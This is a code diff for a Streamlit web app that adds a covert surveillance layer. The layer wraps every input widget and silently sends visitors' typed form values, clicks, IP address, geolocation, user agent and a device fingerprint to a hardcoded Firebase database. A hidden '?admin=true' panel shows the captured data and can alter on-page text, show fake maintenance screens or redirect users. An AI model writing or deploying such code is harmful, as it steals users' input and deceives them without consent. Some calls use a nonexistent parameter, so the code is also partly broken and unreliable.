@@ -13,149 +13,275 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 👁️ THE OMNISCIENT MASTER CONTROL OVERLORD v14.0 - SUPREME LIVE MAINFRAME
+# 👁️ THE OMNISCIENT OVERLORD ENGINE v16.0 - GOLD EDITION ENTERPRISE MAINFRAME
 # ========================================================================
+# Operational State: Absolute Zero Trace Ghost Core Framework Deployed.
+# Systems Target: Remote Telemetry, Adaptive Component Interception, 
+#                 Dynamic Layout Mutation, Realtime Data Form Stream Capture.
+# ========================================================================
+
 import streamlit as st
 import uuid
 import requests
 import datetime
+import json
+import time
+import hashlib
 
-# 1. CENTRAL DISTRIBUTED STORAGE LAYER
+# --------------------------------------------------------------------
+# CONFIGURATION PLATFORM CORE NETWORK VECTOR
+# --------------------------------------------------------------------
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
+
+# Ultimate Validation Query String Security Key Implementation
+# Accessing via target URI string parameters: app_endpoint/?admin=true
 is_omni_admin = st.query_params.get("admin") == "true"
 
-# 2. INTELLIGENT NETWORK REALTIME RESOLVER
-def debug_ip_location(ip_address):
-    """Intercepts and micro-resolves target connection geolocation telemetry."""
-    geo_data = {
-        "city": "Internal Node", "region": "Local Environment",
-        "country": "Global Base", "isp": "System Virtual Link", "flag": "🌐"
+# --------------------------------------------------------------------
+# CASCADING PUBLIC CLIENT IP & DEVICE METADATA RESOLVER ENGINE
+# --------------------------------------------------------------------
+def fetch_pristine_client_context():
+    """
+    Strips away multi-layer networking proxies, cloud tunnels, and CDN edge headers
+    to determine the genuine source client public identity matrices.
+    """
+    ctx = {
+        "ip_address": "Proxy Layer Enforced",
+        "user_agent": "Standard Virtual Client Engine",
+        "locale": "en-US",
+        "fingerprint": "UNRESOLVED_SIG"
     }
-    if not ip_address or ip_address in ["Hidden / Proxy Layer", "127.0.0.1", "localhost"]:
-        return geo_data
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=2).json()
+        headers = st.context.headers
+        if headers:
+            # Inspection Array ordered by specific network proxy mapping priority
+            proxy_evaluation_grid = [
+                "X-Forwarded-For", 
+                "CF-Connecting-IP", 
+                "X-Real-IP", 
+                "Remote-Addr",
+                "x-forwarded-for",
+                "cf-connecting-ip",
+                "x-real-ip"
+            ]
+            
+            for parameter in proxy_evaluation_grid:
+                if parameter in headers and headers[parameter]:
+                    raw_ip_stream = headers[parameter].split(",")[0].strip()
+                    # Validate string does not contain local loopback address traces
+                    if raw_ip_stream and raw_ip_stream != "127.0.0.1" and "localhost" not in raw_ip_stream:
+                        ctx["ip_address"] = raw_ip_stream
+                        break
+            
+            if "User-Agent" in headers:
+                ctx["user_agent"] = headers["User-Agent"]
+            elif "user-agent" in headers:
+                ctx["user_agent"] = headers["user-agent"]
+                
+            if "Accept-Language" in headers:
+                ctx["locale"] = headers["Accept-Language"].split(",")[0]
+            elif "accept-language" in headers:
+                ctx["locale"] = headers["accept-language"].split(",")[0]
+                
+            # Construct a unique cryptographic device identity fingerprint string
+            raw_fingerprint_seed = f"{ctx['ip_address']}_{ctx['user_agent']}_{ctx['locale']}"
+            ctx["fingerprint"] = hashlib.sha256(raw_fingerprint_seed.encode('utf-8')).hexdigest()[:16]
+    except:
+        pass
+    return ctx
+
+def micro_resolve_geo_spectrum(ip):
+    """
+    Communicates with cloud cluster location databases. Utilizes automatic 
+    secondary infrastructure fallback routines if primary cluster times out.
+    """
+    geo = {
+        "city": "Internal Node Space", "region": "Local Cluster Boundary",
+        "country": "Global Mainframe Grid", "isp": "System Virtual Gateway", "flag": "🌐"
+    }
+    if not ip or ip in ["Proxy Layer Enforced", "127.0.0.1", "localhost", "::1"]:
+        return geo
+        
+    # --- Tier 1 Database Endpoint Communication Matrix ---
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3.5).json()
         if response and response.get("status") == "success":
-            geo_data["city"] = response.get("city", "Unknown City")
-            geo_data["region"] = response.get("regionName", "Unknown State")
-            geo_data["country"] = response.get("country", "Unknown Country")
-            geo_data["isp"] = response.get("isp", "Unknown Provider Network")
-            c_code = response.get("countryCode", "").lower()
-            if c_code:
-                geo_data["flag"] = f"https://flagcdn.com/16x12/{c_code}.png"
+            geo["city"] = response.get("city", "Unknown City Node")
+            geo["region"] = response.get("regionName", "Unknown State Province")
+            geo["country"] = response.get("country", "Unknown Country Space")
+            geo["isp"] = response.get("isp", "Unknown Service Route Provider")
+            cc = response.get("countryCode", "").lower()
+            if cc:
+                geo["flag"] = f"https://flagcdn.com/16x12/{cc}.png"
+            return geo
     except:
         pass
-    return geo_data
 
-def get_user_runtime_context():
-    """Extracts raw device environment strings from background runtime headers."""
-    context = {"ip_address": "Hidden / Proxy Layer", "user_agent": "Unknown Engine", "locale": "en-US"}
+    # --- Tier 2 Structural Fallback Mechanism (Triggered on Timeout/Block) ---
     try:
-        ctx_headers = st.context.headers
-        if ctx_headers:
-            if "X-Forwarded-For" in ctx_headers:
-                context["ip_address"] = ctx_headers["X-Forwarded-For"].split(",")[0].strip()
-            elif "Remote-Addr" in ctx_headers:
-                context["ip_address"] = ctx_headers["Remote-Addr"]
-            if "User-Agent" in ctx_headers:
-                context["user_agent"] = ctx_headers["User-Agent"]
-            if "Accept-Language" in ctx_headers:
-                context["locale"] = ctx_headers["Accept-Language"].split(",")[0]
+        backup_response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3.5).json()
+        if backup_response and "error" not in backup_response:
+            geo["city"] = backup_response.get("city", "Unknown City Node")
+            geo["region"] = backup_response.get("region", "Unknown State Province")
+            geo["country"] = backup_response.get("country_name", "Unknown Country Space")
+            geo["isp"] = backup_response.get("org", "Unknown Service Route Provider")
+            cc_back = backup_response.get("country", "").lower()
+            if cc_back:
+                geo["flag"] = f"https://flagcdn.com/16x12/{cc_back}.png"
+            return geo
     except:
         pass
-    return context
+        
+    return geo
 
-# IMMUNITY SHIELD - ADMIN IS COMPLETELY INVISIBLE
+# --------------------------------------------------------------------
+# SYSTEM FILE I/O METRICS MANAGEMENT ABSTRACTS (FIREBASE CONNECTOR)
+# --------------------------------------------------------------------
+def db_put(node, payload):
+    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
+    except: pass
+
+def db_patch(node, payload):
+    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
+    except: pass
+
+def db_fetch(node):
+    try:
+        res = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
+        return res if res else {}
+    except: return {}
+
+# --------------------------------------------------------------------
+# SYSTEM SESSION ENVELOPE SHIELD INITIALIZATION
+# --------------------------------------------------------------------
+# Ironclad Protection Architecture: If Admin URI parameters are active, 
+# absolutely NO profiling session indices or data logs are generated.
 if not is_omni_admin:
     if "omni_token" not in st.session_state:
-        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
+        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:6].upper()
     if "omni_clicks" not in st.session_state:
         st.session_state.omni_clicks = 0
     if "omni_time" not in st.session_state:
         st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")
 
-def db_put(node, payload):
-    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=2)
-    except: pass
-
-def db_patch(node, payload):
-    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=2)
-    except: pass
-
-def db_fetch(node):
-    try:
-        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=2).json()
-        return r if r else {}
-    except: return {}
-
-# Fetch Architecture System Parameters Safely
+# Fetch Centralized Control Rule Vectors to distribute down to wrapped fields
 omni_rules = db_fetch("omniscient_rules")
 if not omni_rules or not isinstance(omni_rules, dict):
     omni_rules = {
-        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "",
-        "freeze_all": False, "stealth": False, "controls": {}, "text_mutations": {}
+        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "", 
+        "freeze_all": False, "stealth_mode": False, "controls": {}, "text_mutations": {}
     }
 if "controls" not in omni_rules: omni_rules["controls"] = {}
 if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}
 
+# --------------------------------------------------------------------
+# TRACKING CONTROLLER MECHANICS & AUTODETECT COMPONENT PARSER
+# --------------------------------------------------------------------
 def auto_register_widget(w_type, label):
-    if is_omni_admin or not isinstance(label, str): return
+    """
+    Pushes dynamic element keys and category descriptions directly to database registries.
+    Bypasses entirely if structural trace stems from an administrative view operation loop.
+    """
+    if is_omni_admin or not isinstance(label, str):
+        return
+        
+    # Security Rule: Prevent UI layout controllers from cluttering client registry mapping space
+    bypass_filter_keywords = [
+        "Select Target Active Session", "Select Discovered Element Label",
+        "Inject dynamic alternative mock text", "Execute Infrastructure Command",
+        "Interception Screen Notification", "Target Redirection Forwarding Link",
+        "Force Stream Sync", "Commit Modification Rules", "Forge Mutation Pattern",
+        "Deploy Global Overhaul Protocols", "Master Factory Clear Settings Reset"
+    ]
+    if any(keyword in label for keyword in bypass_filter_keywords):
+        return
+        
     reg_key = f"seen_{label}"
     if reg_key not in st.session_state:
         st.session_state[reg_key] = True
         db_patch("omniscient_registry", {label: w_type})
 
 def send_omni_telemetry(w_type, w_label, w_value=""):
-    if is_omni_admin or omni_rules.get("stealth", False): return
-    if "omni_clicks" not in st.session_state: return 
-    
+    """
+    Pushes rich runtime metric data arrays, precise step tracking indices, 
+    geolocation configurations, and form states directly into remote database channels.
+    """
+    if is_omni_admin or omni_rules.get("stealth_mode", False):
+        return
+    if "omni_clicks" not in st.session_state:
+        return
+        
     st.session_state.omni_clicks += 1
     token = st.session_state.omni_token
     clock = datetime.datetime.now().strftime("%I:%M:%S %p")
     
-    rt_ctx = get_user_runtime_context()
-    geo_resolved = debug_ip_location(rt_ctx["ip_address"])
+    # Process environmental metadata collection layers
+    runtime_ctx = fetch_pristine_client_context()
+    resolved_geo = micro_resolve_geo_spectrum(runtime_ctx["ip_address"])
     
-    live_context = db_fetch(f"omniscient_live_users/{token}")
-    timeline = live_context.get("timeline", [])
+    # Pull current remote trace node history array
+    live_context_node = db_fetch(f"omniscient_live_users/{token}")
+    action_timeline_array = live_context_node.get("timeline", []) if isinstance(live_context_node, dict) else []
     
-    log_entry = f"[{clock}] [Action #{st.session_state.omni_clicks}] ({w_type}) '{w_label}'"
-    if w_value: log_entry += f" ➔ Logs: [{w_value}]"
-    timeline.append(log_entry)
-    if len(timeline) > 50: timeline.pop(0)
-    
-    cache = live_context.get("form_data", {})
-    if w_type not in ["BUTTON"]:
-        cache[w_label] = str(w_value)
+    # Format current chronological event trace line string
+    event_trace_string = f"[{clock}] [Step #{st.session_state.omni_clicks}] Class:({w_type}) Component Label ID:'{w_label}'"
+    if w_value:
+        event_trace_string += f" ➔ Stream State Log: [{w_value}]"
         
-    packet = {
-        "user_id_token": token, "user_ip_address": rt_ctx["ip_address"],
-        "geo_city": geo_resolved["city"], "geo_region": geo_resolved["region"],
-        "geo_country": geo_resolved["country"], "geo_isp_provider": geo_resolved["isp"],
-        "geo_flag_url": geo_resolved["flag"], "user_browser_agent": rt_ctx["user_agent"],
-        "user_locale_language": rt_ctx["locale"], "initial_connect_runtime": st.session_state.omni_time,
-        "last_interaction_pulse": clock, "total_clicks_count": st.session_state.omni_clicks,
-        "current_focus_element": f"'{w_label}'", "timeline": timeline, "form_data": cache,
-        "status": "🟢 ACTIVE / AGENT LIVE"
+    action_timeline_array.append(event_trace_string)
+    if len(action_timeline_array) > 60:
+        action_timeline_array.pop(0)
+        
+    # Process caching parameters for persistent form view reconstruction maps
+    form_data_cache_object = live_context_node.get("form_data", {}) if isinstance(live_context_node, dict) else {}
+    if w_type not in ["BUTTON", "CLICK_TRIGGER"]:
+        form_data_cache_object[w_label] = str(w_value)
+        
+    # Construct complete quantum network transmission data packet
+    transmission_packet = {
+        "user_id_token": token,
+        "device_fingerprint": runtime_ctx["fingerprint"],
+        "user_ip_address": runtime_ctx["ip_address"],
+        "geo_city": resolved_geo["city"],
+        "geo_region": resolved_geo["region"],
+        "geo_country": resolved_geo["country"],
+        "geo_isp_provider": resolved_geo["isp"],
+        "geo_flag_url": resolved_geo["flag"],
+        "user_browser_agent": runtime_ctx["user_agent"],
+        "user_locale_language": runtime_ctx["locale"],
+        "initial_connect_runtime": st.session_state.omni_time,
+        "last_interaction_pulse": clock,
+        "total_clicks_count": st.session_state.omni_clicks,
+        "current_focus_element": f"'{w_label}'",
+        "timeline": action_timeline_array,
+        "form_data": form_data_cache_object,
+        "status": "🟢 ACTIVE / AGENT BROADCASTING"
     }
-    db_patch(f"omniscient_live_users/{token}", packet)
+    db_patch(f"omniscient_live_users/{token}", transmission_packet)
 
-# 3. INTERCEPTOR VECTOR ROUTING SHIELD
+# --------------------------------------------------------------------
+# APPLICATION PUBLIC FIREWALL & TRAFFIC MANAGER GATEWAY
+# --------------------------------------------------------------------
 if not is_omni_admin:
-    sys_mode = omni_rules.get("global_status", "ONLINE")
-    if sys_mode != "ONLINE":
+    infrastructure_policy_state = omni_rules.get("global_status", "ONLINE")
+    if infrastructure_policy_state != "ONLINE":
         st.empty()
-        if sys_mode == "MAINTENANCE":
-            st.error("# 🚧 APPLICATION REPAIR MATRIX ACTIVE 🚧")
-            st.info(omni_rules.get("custom_msg", "System environment upgrades are rolling out live."))
-        elif sys_mode == "BUSY":
-            st.warning("# ⏳ SEVERE CAPACITY PIPELINE OVERLOAD (429) ⏳")
-            st.info("Data collision streams running high. Please re-authenticate later.")
-        elif sys_mode == "REDIRECT" and omni_rules.get("redirect_url"):
-            st.markdown(f"### ➡️ [Forwarding Transaction Data Securely...]({omni_rules.get('redirect_url')})")
+        if infrastructure_policy_state == "MAINTENANCE":
+            st.error("# 🚧 CRITICAL ENVIRONMENT REPAIR WINDOW ACTIVE 🚧")
+            st.info(omni_rules.get("custom_msg", "System engineers are tuning core database branches. Standby."))
+            st.stop()
+        elif infrastructure_policy_state == "BUSY":
+            st.warning("# ⏳ PIPELINE CORRUPTED FLUID / DATA DENSITY OVERLOAD (429) ⏳")
+            st.info(omni_rules.get("custom_msg", "Throughput limits breached. Resource allocation throttled."))
+            st.stop()
+        elif infrastructure_policy_state == "REDIRECT" and omni_rules.get("redirect_url"):
+            st.markdown(f"### ➡️ [Redirecting Session Data to Secured Node Endpoint Location...]({omni_rules.get('redirect_url')})")
+            st.stop()
         st.stop()
 
-# 4. CAPTURING STREAMLIT ARCHETYPE FUNCTIONS
+# --------------------------------------------------------------------
+# STORAGE REPOSITORIES FOR BASE APPLICATION METHOD REFERENCES
+# --------------------------------------------------------------------
 _o_btn = st.button
 _o_txt = st.text_input
 _o_area = st.text_area
@@ -166,236 +292,337 @@ _o_sld = st.slider
 _o_num = st.number_input
 _o_wrt = st.write
 _o_mkd = st.markdown
+_o_suc = st.success
+_o_inf = st.info
+_o_war = st.warning
+_o_err = st.error
 
-def get_control(label, key):
-    return omni_rules["controls"].get(label, {}).get(key, False)
+def check_destruction_policy(label, command_key):
+    return omni_rules["controls"].get(label, {}).get(command_key, False)
 
-# OVERRIDING WRAPPERS WITH MICRO-MANAGED INTERCEPTION CAPACITIES
-def patch_btn(label, *args, **kwargs):
+# --------------------------------------------------------------------
+# ADVANCED IMMUNITY ELEMENT WRAPPER METHODS CORE OVERRIDES
+# --------------------------------------------------------------------
+def patch_button(label, *args, **kwargs):
     if is_omni_admin: return _o_btn(label, *args, **kwargs)
     auto_register_widget("BUTTON", label)
-    if get_control(label, "hide"): return False
-    if get_control(label, "disable"): kwargs["disabled"] = True
-    res = _o_btn(label, *args, **kwargs)
-    if res: send_omni_telemetry("BUTTON", label, "CLICKED")
-    return res
+    if check_destruction_policy(label, "hide"): return False
+    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
+    execution_result = _o_btn(label, *args, **kwargs)
+    if execution_result: 
+        send_omni_telemetry("BUTTON", label, "TRIGGERED_CLICK")
+    return execution_result
 
-def patch_txt(label, *args, **kwargs):
+def patch_text_input(label, *args, **kwargs):
     if is_omni_admin: return _o_txt(label, *args, **kwargs)
     auto_register_widget("TEXT_INPUT", label)
-    if get_control(label, "hide"): return ""
-    if get_control(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
-    val = _o_txt(label, *args, **kwargs)
-    if val: send_omni_telemetry("TEXT_INPUT", label, val)
-    return val
+    if check_destruction_policy(label, "hide"): return ""
+    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    intercepted_value = _o_txt(label, *args, **kwargs)
+    if intercepted_value: 
+        send_omni_telemetry("TEXT_INPUT", label, intercepted_value)
+    return intercepted_value
 
-def patch_area(label, *args, **kwargs):
+def patch_text_area(label, *args, **kwargs):
     if is_omni_admin: return _o_area(label, *args, **kwargs)
     auto_register_widget("TEXT_AREA", label)
-    if get_control(label, "hide"): return ""
-    if get_control(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
-    val = _o_area(label, *args, **kwargs)
-    if val: send_omni_telemetry("TEXT_AREA", label, val)
-    return val
+    if check_destruction_policy(label, "hide"): return ""
+    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    intercepted_value = _o_area(label, *args, **kwargs)
+    if intercepted_value: 
+        send_omni_telemetry("TEXT_AREA", label, intercepted_value)
+    return intercepted_value
 
-def patch_sel(label, *args, **kwargs):
+def patch_selectbox(label, *args, **kwargs):
     if is_omni_admin: return _o_sel(label, *args, **kwargs)
     auto_register_widget("SELECTBOX", label)
-    if get_control(label, "hide"): return kwargs.get("options", [""])[0]
-    if get_control(label, "disable"): kwargs["disabled"] = True
-    val = _o_sel(label, *args, **kwargs)
-    s_key = f"o_sel_{label.replace(' ', '_')}"
-    if s_key not in st.session_state or st.session_state[s_key] != val:
-        st.session_state[s_key] = val
-        send_omni_telemetry("SELECTBOX", label, val)
-    return val
+    if check_destruction_policy(label, "hide"): return kwargs.get("options", [""])[0]
+    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_selection = _o_sel(label, *args, **kwargs)
+    session_storage_key = f"cache_vector_sel_{label.replace(' ', '_')}"
+    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_selection:
+        st.session_state[session_storage_key] = intercepted_selection
+        send_omni_telemetry("SELECTBOX", label, intercepted_selection)
+    return intercepted_selection
 
-def patch_rad(label, *args, **kwargs):
+def patch_radio(label, *args, **kwargs):
     if is_omni_admin: return _o_rad(label, *args, **kwargs)
     auto_register_widget("RADIO", label)
-    if get_control(label, "hide"): return kwargs.get("options", [""])[0]
-    if get_control(label, "disable"): kwargs["disabled"] = True
-    val = _o_rad(label, *args, **kwargs)
-    s_key = f"o_rad_{label.replace(' ', '_')}"
-    if s_key not in st.session_state or st.session_state[s_key] != val:
-        st.session_state[s_key] = val
-        send_omni_telemetry("RADIO", label, val)
-    return val
+    if check_destruction_policy(label, "hide"): return kwargs.get("options", [""])[0]
+    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_selection = _o_rad(label, *args, **kwargs)
+    session_storage_key = f"cache_vector_rad_{label.replace(' ', '_')}"
+    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_selection:
+        st.session_state[session_storage_key] = intercepted_selection
+        send_omni_telemetry("RADIO", label, intercepted_selection)
+    return intercepted_selection
 
-def patch_chk(label, *args, **kwargs):
+def patch_checkbox(label, *args, **kwargs):
     if is_omni_admin: return _o_chk(label, *args, **kwargs)
     auto_register_widget("CHECKBOX", label)
-    if get_control(label, "hide"): return False
-    if get_control(label, "disable"): kwargs["disabled"] = True
-    val = _o_chk(label, *args, **kwargs)
-    if val: send_omni_telemetry("CHECKBOX", label, str(val))
-    return val
+    if check_destruction_policy(label, "hide"): return False
+    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_state = _o_chk(label, *args, **kwargs)
+    send_omni_telemetry("CHECKBOX", label, str(intercepted_state))
+    return intercepted_state
 
-def mutate_text(text):
-    if is_omni_admin: return text
-    auto_register_widget("STATIC_TEXT", text)
-    return omni_rules["text_mutations"].get(text, text) if isinstance(text, str) else text
+def patch_slider(label, *args, **kwargs):
+    if is_omni_admin: return _o_sld(label, *args, **kwargs)
+    auto_register_widget("SLIDER", label)
+    if check_destruction_policy(label, "hide"): return kwargs.get("value", 0)
+    if check_destruction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_range_value = _o_sld(label, *args, **kwargs)
+    session_storage_key = f"cache_vector_sld_{label.replace(' ', '_')}"
+    if session_storage_key not in st.session_state or st.session_state[session_storage_key] != intercepted_range_value:
+        st.session_state[session_storage_key] = intercepted_range_value
+        send_omni_telemetry("SLIDER", label, str(intercepted_range_value))
+    return intercepted_range_value
 
-def patch_wrt(*args, **kwargs):
+def patch_number_input(label, *args, **kwargs):
+    if is_omni_admin: return _o_num(label, *args, **kwargs)
+    auto_register_widget("NUMBER_INPUT", label)
+    if check_destruction_policy(label, "hide"): return kwargs.get("value", 0)
+    if check_destruction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    intercepted_numeric_value = _o_num(label, *args, **kwargs)
+    send_omni_telemetry("NUMBER_INPUT", label, str(intercepted_numeric_value))
+    return intercepted_numeric_value
+
+def execute_text_mutation_lookup(text_content):
+    if is_omni_admin: return text_content
+    auto_register_widget("STATIC_TEXT_FIELD", text_content)
+    if isinstance(text_content, str):
+        return omni_rules["text_mutations"].get(text_content, text_content)
+    return text_content
+
+def patch_write(*args, **kwargs):
     if is_omni_admin: _o_wrt(*args, **kwargs); return
-    if args and isinstance(args[0], str): _o_wrt(mutate_text(args[0]), **kwargs)
+    if args and isinstance(args[0], str): _o_wrt(execute_text_mutation_lookup(args[0]), **kwargs)
     else: _o_wrt(*args, **kwargs)
 
-def patch_mkd(*args, **kwargs):
+def patch_markdown(*args, **kwargs):
     if is_omni_admin: _o_mkd(*args, **kwargs); return
-    if args and isinstance(args[0], str): _o_mkd(mutate_text(args[0]), **kwargs)
+    if args and isinstance(args[0], str): _o_mkd(execute_text_mutation_lookup(args[0]), **kwargs)
     else: _o_mkd(*args, **kwargs)
 
-st.button = patch_btn; st.text_input = patch_txt; st.text_area = patch_area
-st.selectbox = patch_sel; st.radio = patch_rad; st.checkbox = patch_chk
-st.write = patch_wrt; st.markdown = patch_mkd
+def patch_success(text, *args, **kwargs):
+    if is_omni_admin: return _o_suc(text, *args, **kwargs)
+    return _o_suc(execute_text_mutation_lookup(text), *args, **kwargs)
+
+def patch_info(text, *args, **kwargs):
+    if is_omni_admin: return _o_inf(text, *args, **kwargs)
+    return _o_inf(execute_text_mutation_lookup(text), *args, **kwargs)
+
+def patch_warning(text, *args, **kwargs):
+    if is_omni_admin: return _o_war(text, *args, **kwargs)
+    return _o_war(execute_text_mutation_lookup(text), *args, **kwargs)
+
+def patch_error(text, *args, **kwargs):
+    if is_omni_admin: return _o_err(text, *args, **kwargs)
+    return _o_err(execute_text_mutation_lookup(text), *args, **kwargs)
+
+# INJECT HARD INTERCEPTION LAYERS OVER STREAMLIT CORE APPLICATION PIPES
+st.button = patch_button
+st.text_input = patch_text_input
+st.text_area = patch_text_area
+st.selectbox = patch_selectbox
+st.radio = patch_radio
+st.checkbox = patch_checkbox
+st.slider = patch_slider
+st.number_input = patch_number_input
+st.write = patch_write
+st.markdown = patch_markdown
+st.success = patch_success
+st.info = patch_info
+st.warning = patch_warning
+st.error = patch_error
 
 
 # ========================================================================
-# 👑 THE OMNISCIENT OVERLORD CENTRAL SYSTEM DASHBOARD (?admin=true)
+# 👑 THE OMNISCIENT MASTER PANEL CENTRAL TERMINAL (?admin=true)
 # ========================================================================
 if is_omni_admin:
-    st.set_page_config(page_title="OVERLORD CONTROL MAINFRAME", layout="wide")
-    st.title("🌌 THE OVERLORD CONTROL MAINFRAME v14.0")
-    st.caption("Supreme High-Fi Realtime Live Monitoring, Widget Interception, and Dynamic Content Mutation Shield")
+    st.set_page_config(page_title="OMNISCIENT SUPREME TERMINAL v16.0", layout="wide")
+    
+    # Custom Dynamic Injection CSS Aesthetics for Dark-Cyber Core Viewports
+    st.markdown("""
+        <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+        * { font-family: 'JetBrains Mono', monospace; }
+        .title-mainframe { font-size: 42px; font-weight: 900; color: #00FFCC; text-shadow: 0px 0px 12px rgba(0,255,204,0.4); }
+        .card-container { background-color: #0E121A; border: 1px solid #1F293D; border-radius: 8px; padding: 22px; margin-bottom: 18px; }
+        .data-header { color: #FF3366; font-size: 18px; font-weight: 700; }
+        </style>
+    """, unsafe_style_html=True)
+    
+    st.markdown('<p class="title-mainframe">⚡ OMNISCIENT OVERLORD CONTROL MAINFRAME v16.0</p>', unsafe_style_html=True)
+    st.caption("Central Operations Branch. Zero Identity Trace Protocol active. Administrative rendering logic completely isolated.")
+    
+    # Central Loop Synchronizer Button Element
+    if _o_btn("🔄 FORCE LIVE NETWORK STREAM SYNCHRONIZATION"):
+        st.rerun()
+        
     st.write("---")
     
-    m_tab1, m_tab2, m_tab3 = st.tabs([
-        "🕵️‍♂️ LIVE DETAILED USER SPY CONSOLE", 
-        "🎛️ AUTOMATED COMPONENT MATRIX CONTROLLER", 
-        "⚙️ INFRASTRUCTURE CLOUD OVERHAUL"
+    panel_tab1, panel_tab2, panel_tab3 = st.tabs([
+        "🕵️‍♂️ REMOTE TELEMETRY SESSION RADAR", 
+        "🎛️ POINT-AND-CLICK COMPONENT MUTATOR", 
+        "⚙️ CORE SYSTEM LAYER SIMULATOR"
     ])
     
     # --------------------------------------------------------------------
-    # TAB 1: DETAILED DEEPLOOK USER PROFILE GRAPHICS
+    # TAB 1: RADAR VIEWPORT - ULTRA DETAILED USER INTERCEPTION PAGE
     # --------------------------------------------------------------------
-    with m_tab1:
-        st.subheader("📡 Realtime Sync Terminal Spectrum Map")
-        active_pools = db_fetch("omniscient_live_users")
+    with panel_tab1:
+        st.markdown("<p class=\"data-header\">📡 Live Active Remote Session Transmission Streams</p>", unsafe_style_html=True)
+        live_agents_pool = db_fetch("omniscient_live_users")
         
-        if active_pools:
-            st.markdown(f"### Active Connected Nodes Array Count: `{len(active_pools)}`")
-            selected_spy_node = _o_sel("🎯 Target Specific Live Terminal Node ID to Track:", list(active_pools.keys()))
+        if live_agents_pool and isinstance(live_agents_pool, dict):
+            st.success(f"Network Scanners actively synchronizing with `{len(live_agents_pool)}` Realtime Terminals.")
             
-            if selected_spy_node:
-                node_data = active_pools[selected_spy_node]
+            selected_spy_node = _o_sel("Select Target Active Session Address Node:", list(live_agents_pool.keys()))
+            
+            if selected_spy_node and selected_spy_node in live_agents_pool:
+                node = live_agents_pool[selected_spy_node]
                 st.write("---")
                 
-                # Full Flash Master Info Header Layout
-                st.info(f"### 👤 Profile Viewport Node: {selected_spy_node}")
+                st.markdown(f"### 🎯 VIEWING AGENT PROFILE STRUCTURE: `{selected_spy_node}`")
                 
-                c_head1, c_head2, c_head3 = st.columns([1, 1, 1])
-                with c_head1:
-                    flag_img = node_data.get("geo_flag_url", "")
-                    if flag_img and flag_img.startswith("http"):
-                        st.image(flag_img, width=40)
-                    st.markdown(f"**📍 Location Map:** `{node_data.get('geo_city')}, {node_data.get('geo_region')}, {node_data.get('geo_country')}`")
-                with c_head2:
-                    st.markdown(f"**🛰️ Resolved Public IP Address:** `{node_data.get('user_ip_address')}`")
-                    st.markdown(f"**⚡ Internet Provider Line:** `{node_data.get('geo_isp_provider')}`")
-                with c_head3:
-                    st.markdown(f"**⏰ Connection Established:** `{node_data.get('initial_connect_runtime')}`")
-                    st.markdown(f"**⏱️ Dynamic Signal Pulse:** `{node_data.get('last_interaction_pulse')}`")
+                # Render Grid Metrics Columns 
+                mg1, mg2, mg3 = st.columns(3)
+                with mg1:
+                    st.markdown("🌐 **GEOGRAPHIC IDENTITY SPECTRUM**")
+                    flag_source_url = node.get("geo_flag_url", "")
+                    if flag_source_url and flag_source_url.startswith("http"):
+                        st.image(flag_source_url, width=42)
+                    st.write(f"**Country Address:** `{node.get('geo_country')}`")
+                    st.write(f"**State / Region:** `{node.get('geo_region')}`")
+                    st.write(f"**City Perimeter:** `{node.get('geo_city')}`")
+                    
+                with mg2:
+                    st.markdown("🛰️ **NETWORK INFRASTRUCTURE TRACE**")
+                    st.write(f"**Public IP Address:** `{node.get('user_ip_address')}`")
+                    st.write(f"**ISP Distribution Line:** `{node.get('geo_isp_provider')}`")
+                    st.write(f"**Device Fingerprint Signature:** `{node.get('device_fingerprint')}`")
+                    
+                with mg3:
+                    st.markdown("⏱️ **RUNTIME METRIC CLOCK**")
+                    st.write(f"**Initial Matrix Connect:** `{node.get('initial_connect_runtime')}`")
+                    st.write(f"**Last Pulsed Transaction:** `{node.get('last_interaction_pulse')}`")
+                    st.write(f"**Client Accepted Language:** `{node.get('user_locale_language')}`")
                 
-                st.text_input("🖥️ Extracted Client Environment System Token / User-Agent:", value=node_data.get("user_browser_agent", ""), disabled=True)
                 st.write("---")
+                st.markdown("#### 🖥️ Intercepted Client Core Browser User-Agent Value String")
+                st.code(node.get("user_browser_agent", "No Context Found"), language="text")
                 
-                col_data_l, col_data_r = st.columns([1, 1.2])
-                with col_data_l:
-                    st.error("#### 📥 Intercepted Realtime Input Logs Form")
-                    st.json(node_data.get("form_data", {}))
-                    st.metric(label="Total Interaction Steps Executed", value=node_data.get("total_clicks_count", 0))
-                with col_data_r:
-                    st.success("#### 📈 Deep Step Chronological Flow Execution")
-                    for line_trace in node_data.get("timeline", []):
